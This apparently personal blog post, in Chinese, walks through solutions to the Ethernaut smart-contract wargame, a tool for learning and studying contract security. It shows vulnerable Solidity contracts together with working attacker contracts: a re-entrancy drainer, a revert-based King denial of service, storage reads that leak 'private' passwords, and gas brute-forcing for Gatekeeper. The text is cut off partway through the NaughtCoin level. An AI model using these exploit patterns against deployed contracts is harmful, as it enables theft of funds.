<!DOCTYPE html><html lang="zh_CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Ethernaut | LexLady</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 共 $1 行","copy":"复制","copyFinish":"完成","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="LexLady" type="application/atom+xml">
</head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>Ethernaut</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-02-25T12:44:02.000Z" id="date"> 2023-02-25</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-11-24T15:37:09.483Z" id="updated"> 2023-11-24</time></div></span></div></div><hr><div id="post-content"><p>此文章会记录在Ethernaut上经历的题。</p>
<span id="more"></span>
<h1 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h1><p>在第一题中，我们会跟着引导通过web终端进行操作，基本上没什么难度，一步步地按照提示来做就行。<del>你甚至可以通过直接查看合约ABI来推断出答案，实在是太友好了！！</del><br>收获：  </p>
<ul>
<li>关键字的使用</li>
<li>各种变量的存储位置</li>
</ul>
<hr>
<h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><p>任务要求：让合约的balance大于0</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Force &#123;/*<br><br>                   MEOW ?<br>         /\_/\   /<br>    ____/ o o \<br>  /~____  =ø= /<br> (______)__m_m)<br><br>*/&#125;<br></code></pre></td></tr></table></figure>
<p>解题点：<del>MEOW~（不是）</del></p>
<p>在以太坊中可以强制给一个合约发送以太，无论合约是否拒绝。通过函数selfdestruct来实现。</p>
<blockquote>
<p>这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送的资金会无视这一点。</p>
</blockquote>
<p>因此我们只需要创建一个合约往合约中存点eth然后调用selfdestruct发送给实例合约就行。</p>
<blockquote>
<p>在最新版本的solidity中selfdestruct已经被禁用了</p>
</blockquote>
<hr>
<h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h1><p>任务要求：将合约中的bool值改变</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Vault &#123;<br>  bool public locked;<br>  bytes32 private password;<br><br>  constructor(bytes32 _password) &#123;<br>    locked = true;<br>    password = _password;<br>  &#125;<br><br>  function unlock(bytes32 _password) public &#123;<br>    if (password == _password) &#123;<br>      locked = false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题点：输入密码<del>废话</del></p>
<p>任何数据在区块链上都是透明的！（战术后仰）通过web3中的getStorageAt函数直接获取合约里的状态变量的值</p>
<blockquote>
<p><code>web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</code><br>参数1：String 获取存储的地址；参数2：存储的索引位置；参数3：（可选）不使用web3.eth.defaultBlock设置的默认块，而是自定义或预定义的块号；参数4：（可选）可选回调，返回一个错误对象作为第一个参数，结果作为第二个参数<br>Returns ：返回给定位置的值</p>
<p>选自web3.<a target="_blank" rel="noopener" href="https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getstorageat">eth官方文档</a></p>
</blockquote>
<p>在控制台中输入<code>web3.eth.getStorageAt(InstenceAddress, 1)</code>，得到密码——因为在slot0中存储的是锁的状态，所以我们要的是slot1中的密码</p>
<p>接着，直接调用<code>contract.unlock(&quot;上面获得的数据&quot;)</code>就能通关了。</p>
<hr>
<h1 id="King"><a href="#King" class="headerlink" title="King"></a>King</h1><p>任务要求：确保王位</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract King &#123;<br><br>  address king;<br>  uint public prize;<br>  address public owner;<br><br>  constructor() payable &#123;<br>    owner = msg.sender;  <br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt;= prize || msg.sender == owner);<br>    payable(king).transfer(msg.value);<br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  function _king() public view returns (address) &#123;<br>    return king;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>解题点：<code>payable(king).transfer(msg.value);</code></p>
<p>当新的国王诞生时将会给老国王原来的奖金，那么只要原来的国王不接受直接进行revert，那么就可以永远的占据合约的king</p>
<p>参考：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma ...<br><br>contract attack&#123;<br>  constructor (address _addr) public payable&#123;<br>    _addr.call&#123;gas:100000000,value:msg.value&#125;;<br>  &#125;<br><br>  // 可以通过不创建任何Fallback或receive方法，也可以通过如下方法<br>  receive() external payable &#123;<br>    revert();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<hr>
<h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1><p>任务要求：盗取合约中的所有代币</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.12;<br><br>import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;<br><br>contract Reentrance &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>解题点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>
<p>在整个合约中，只有这个函数才能将代币发送出去：他会接受一个输入，只要我们的余额大于等于指定的金额将会进行发送；然后更新余额。</p>
<p>因此这是个典型的重入攻击，我们在msg.sender.call()接受余额的同时执行我们的Fallback函数，在fallback中继续调用withdraw。</p>
<p>同时我们需要再某个时刻打破这个循环，否则会revert：首先可以获取目标合约的余额作为提取的最大金额，我们提取的金额最大为存入的金额，因此将其作为最小值。</p>
<p>在min(1e18,address(target).balance)中，我们每次获取目标的金额进行判断，在其未归零前都可以进行取款操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  Reentrance private target;<br>  constructor(address _target) &#123;<br>    target = Reentrance(_target);<br>  &#125;<br><br>  function attack() external payable &#123;<br>    target.donate&#123;value: 1e18&#125;(address(this));<br>    target.withdraw(1e18);<br>  &#125;<br><br>  receive() external payable &#123;<br>    uint amount = min(1e18,address(target).balance);<br>    if (amount &gt; 0) &#123;<br>      target.withdraw(amount);<br>    &#125;<br>  &#125;<br><br>  function min(uint x,uint y) private pure returns (uint) &#123;<br>    return x &lt;= y ? x : y;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>重入的关键：发送完成后才进行了sender的balances更新</p>
<hr>
<h1 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h1><p>这个电梯不让你到达顶楼，想办法到达顶楼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>该题提供了一个接口Building，我们执行goTo()方法时，在Elevator合约中将在我们的地址上执行接口，接着该接口又会调用isLastFloor函数两次，为了执行判断内语句，第一次isLastFloor返回的结果要求False，接着第二次调用返回的结果需要是True。因此我们只需要实现一个能够在两次调用中实现相反输出的isLastFloor函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>    Elevator private target;<br>    bool private b = true;<br><br>    constructor (address _target) &#123;<br>      target = Elevator(_target);<br>    &#125;<br><br>    function isLastFloor(uint) external returns(bool) &#123;<br>        b = !b;<br>        return b;<br>    &#125;<br>    <br>    function pwn() public &#123;<br>        target.goTo(1); //输入的数并不最要<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<hr>
<h1 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h1><p>任务要求：解锁合约。</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Privacy &#123;<br><br>  bool public locked = true;<br>  uint256 public ID = block.timestamp;<br>  uint8 private flattening = 10;<br>  uint8 private denomination = 255;<br>  uint16 private awkwardness = uint16(block.timestamp);<br>  bytes32[3] private data;<br><br>  constructor(bytes32[3] memory _data) &#123;<br>    data = _data;<br>  &#125;<br>  <br>  function unlock(bytes16 _key) public &#123;<br>    require(_key == bytes16(data[2]));<br>    locked = false;<br>  &#125;<br><br>  /*<br>    A bunch of super advanced solidity algorithms...<br><br>      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`<br>      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,<br>      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\<br>      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)<br>      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU<br>  */<br>&#125;<br></code></pre></td></tr></table></figure>
<p>合约部署需要一个包含3个<code>bytes32</code>元素的数组。而在solidity中是无法直接传递固定大小的数组，可以猜测实例是通过另一个合约协助部署的类似于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract PrivacyDeployer &#123;<br>    Privacy public privacyInstance;<br><br>    constructor() &#123;<br>        // Example data for _data parameter<br>        bytes32[3] memory data = [<br>            bytes32(&quot;Some data 1&quot;),<br>            bytes32(&quot;Some data 2&quot;),<br>            bytes32(&quot;Some data 3&quot;)<br>        ];<br>        <br>        privacyInstance = new Privacy(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>接着要使<code>locked</code>改变，只有调用<code>unlock</code>函数，提供一个<code>bytes16</code>的<code>_key</code>且与<code>_data</code>数组的第三个参数匹配。</p>
<p>简单回顾一下智能合约中状态变量是如何存储的：</p>
<p>在合约内部定义状态变量的顺序决定了变量存储在EVM中的字节值。每个slot能存储32字节的数据，在没存储满时允许不超过剩余存储字节的变量接着往后存储。不然开辟新的slot空间存储变量。</p>
<p>在本题中，首先定义了一个bool变量，占slot0的位置。接下来uint256的ID一共32字节因此在slot1的位置；接着是两个1字节和一个2字节的uint变量都位于slot2的位置，于是bytes32数组的存储位置便在slot3、slot4、slot5。</p>
<p>而unlock需要的参数便是数组的第三个参数即slot5存储的数据，我们直接用web3中提供的方法获取到便行。然后截取前16字节。</p>
<p><code>web3.eth.getStorageAt(&quot;youraddr&quot;,5)</code>然后<code>.slice(0,34)</code>因为前两位是0x，同是2字符表示1字节，<code>16*2+2=34</code>。</p>
<hr>
<h1 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h1><p>任务要求：成为entrant</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract GatekeeperOne &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    require(gasleft() % 8191 == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);<br>      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);<br>      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>要成为entrant，我们只有调用<code>enter</code>方法且满足<code>gateOne</code>，<code>gateTwo</code>，<code>gateThree</code>三个修饰符。现在让我们逐步分析三个修饰符：</p>
<ul>
<li><code>gateOne</code>：要求调用者不是外部账户本身，因此，我们需要使用一个合约来调用Gatekeeper的<code>enter</code>函数。</li>
<li><code>gateTwo</code>：要求当前交易的剩余燃气量（gasleft()）必须是 8191 的倍数。</li>
<li><code>gateThree</code>：传入一个<code>bytes8</code>类型的<code>_gateKey</code>参数。<ul>
<li>第一个条件要求<code>_gateKey</code>的低 32 位等于其低 16 位。</li>
<li>第二个条件要求<code>_gateKey</code>的低 32 位不等于其低 64 位。</li>
<li>第三个条件要求<code>_gateKey</code>的低 32 位等于调用者的低 20 位。</li>
</ul>
</li>
</ul>
<p>遇到这种构造类题目，从最难的条件开始往前推更一目了然。例如对这道题的分析，第一个修饰符只要我们从另一个合约调用enter方法，因此至少想到攻击合约需要有<code>GatekeeperOne(target).enter(xxx)</code>这样的语句，</p>
<p>接着第二点需要gasleft()，这没有办法知道答案，只有靠暴力测试一个一个试。</p>
<p>第三点，满足三个子条件，对于数据转换较多的时候，进行类似因式分解的提取操作能使代码更简洁。这里我们把<code>uint64(_gateKey)</code>替换成一个k，满足条件就为：</p>
<ul>
<li>uint32(k) &#x3D;&#x3D; uint16(k)</li>
<li>uint32(k) !&#x3D; k</li>
<li>uint32(k) &#x3D;&#x3D; uint16(uint160(tx.origin))</li>
</ul>
<p>这样，我们只着重于构造一个满足上述式子的k值就大功告成了。</p>
<p>继续分析，从最难的开始：uint32(k) &#x3D;&#x3D; uint16(uint160(tx.origin))，只需要构造一个：<code>uint16 k16 = uint16(uint160(tx.origin))</code>就能满足</p>
<p>同时，这个k16的值恰好满足<code>uint32(k) == uint16(k)</code>，那我们接着进行第二点：uint32(k) !&#x3D; k，因为我们最后传入的值是bytes8，那么这里用uint64就合适了，如果k的值大于2^32-1，那么在进行<code>uint32</code>强制转换时，它的高位都将被截断，保留低32位，这时uint32(k)将会失去一部分值导致uint32(k) !&#x3D; k。于是最终的k为uint64 k &#x3D; uint64(1 &lt;&lt; 63) + uint64(k16)。再将其转换为一个bytes8类型的数就是我们需要的_gateKey。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  GatekeeperOne target;<br>  event Gas(uint num);<br><br>  constructor(address _target) &#123;<br>    target = GatekeeperOne(_target);<br>  &#125;<br><br>  function enter(bytes8 key, uint gas) external &#123;<br>    require(target.enter&#123;gas: 8191*10+gas&#125;(key));<br>  &#125;<br><br>  function Key() public view returns (bytes8) &#123;<br><br>    uint16 k16 = uint16(uint160(tx.origin));<br><br>    uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16);<br><br>    bytes8 key = bytes8(k64);<br><br>    return key;<br>  &#125;<br><br>  function test(bytes8 key) public &#123;<br>    for (uint i = 100; i &lt; 8191; i++) <br>    &#123;<br>      try target.enter&#123;gas: 8191*10+i&#125;(this.Key())  &#123;<br>        emit Gas(i);<br>        return ;<br>      &#125; catch &#123;&#125;<br>    &#125;<br>    revert(&quot;all failed&quot;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="Gatekeeper-Tow"><a href="#Gatekeeper-Tow" class="headerlink" title="Gatekeeper Tow"></a>Gatekeeper Tow</h1><p>任务要求：成为entrant</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract GatekeeperTwo &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    uint x;<br>    assembly &#123; x := extcodesize(caller()) &#125;<br>    require(x == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>同上一个挑战是同一种类型，因此直接分析enter执行条件：</p>
<ul>
<li><code>gateOne</code>：要求使用合约调用。</li>
<li><code>gateTwo</code>：貌似要求msg.sender不是一个合约。</li>
<li><code>gateThree</code>：传入一个<code>bytes8</code>类型的<code>_gateKey</code>参数。</li>
</ul>
<p>直接分析，关于extcodesize()的部分可以看文章末尾，现在我们满足gateThree：<code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)</code>，一个计算式都看着又臭又长，但是不要怕，我们直接定义变量进行简化。</p>
<p>首先对左边进行处理：<code>uint64 x = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>注意，这里的msg.sender应该是我们的合约，因此<strong>要用address(this)进行替换</strong>，uint64(_gateKey)便是我们传入的值，定义为key，于是简化为：</p>
<p><code>x ^ key == type(uint64).max</code>，这样一个异或运算，同时我们知道在异或运算中：<code>a ^ a ^ b = b</code></p>
<p>而我们又可以有：<code>x ^ x ^ key == key</code>，这里的<code>x ^ key又等于type(uint64).max</code>，由此可得<code>key = x ^ type(uint64).max</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  constructor(GatekeeperTwo target) &#123;<br>    uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));<br>    <br>    uint64 k64 = s ^ type(uint64).max;<br>    <br>    bytes8 key = bytes8(k64);<br>    target.enter(key);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>extcodesize()</p>
</blockquote>
<hr>
<h1 id="NaughtCoin"><a href="#NaughtCoin" class="headerlink" title="NaughtCoin"></a>NaughtCoin</h1><p>任务要求：通过转移走合约中的所有余额。</p>
<p><strong>源代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 